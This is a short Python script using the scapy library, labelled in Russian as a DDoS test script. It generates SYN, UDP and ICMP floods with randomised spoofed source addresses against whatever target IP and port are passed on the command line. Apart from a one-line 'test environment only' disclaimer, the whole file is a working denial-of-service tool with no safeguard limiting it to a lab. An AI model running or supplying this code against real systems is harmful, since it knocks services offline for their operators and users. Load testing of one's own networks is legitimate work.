import sys
import time
import random
from scapy.all import IP, TCP, UDP, ICMP, send

"""
DDoS Test Script
Генерирует массовые SYN, UDP и ICMP пакеты для имитации DDoS-атаки.
Используйте только в тестовой среде!
"""

def syn_flood(target_ip, target_port, count=1000):
    print(f"[DDoS] SYN flood: {target_ip}:{target_port}, count={count}")
    for _ in range(count):
        ip = IP(dst=target_ip, src=f"192.168.{random.randint(0,255)}.{random.randint(1,254)}")
        tcp = TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
        send(ip/tcp, verbose=0)
    print("[DDoS] SYN flood completed.")

def udp_flood(target_ip, target_port, count=1000):
    print(f"[DDoS] UDP flood: {target_ip}:{target_port}, count={count}")
    for _ in range(count):
        ip = IP(dst=target_ip, src=f"10.0.{random.randint(0,255)}.{random.randint(1,254)}")
        udp = UDP(sport=random.randint(1024,65535), dport=target_port)
        send(ip/udp/bytes(random.getrandbits(8) for _ in range(32)), verbose=0)
    print("[DDoS] UDP flood completed.")

def icmp_flood(target_ip, count=1000):
    print(f"[DDoS] ICMP flood: {target_ip}, count={count}")
    for _ in range(count):
        ip = IP(dst=target_ip, src=f"172.16.{random.randint(0,255)}.{random.randint(1,254)}")
        icmp = ICMP()
        send(ip/icmp, verbose=0)
    print("[DDoS] ICMP flood completed.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python ddos_test.py <attack_type> <target_ip> [target_port] [count]")
        print("attack_type: syn, udp, icmp")
        sys.exit(1)
    attack_type = sys.argv[1]
    target_ip = sys.argv[2]
    target_port = int(sys.argv[3]) if len(sys.argv) > 3 and attack_type != "icmp" else 80
    count = int(sys.argv[4]) if len(sys.argv) > 4 else 1000

    if attack_type == "syn":
        syn_flood(target_ip, target_port, count)
    elif attack_type == "udp":
        udp_flood(target_ip, target_port, count)
    elif attack_type == "icmp":
        icmp_flood(target_ip, count)
    else:
        print("Unknown attack type. Use: syn, udp, icmp.")
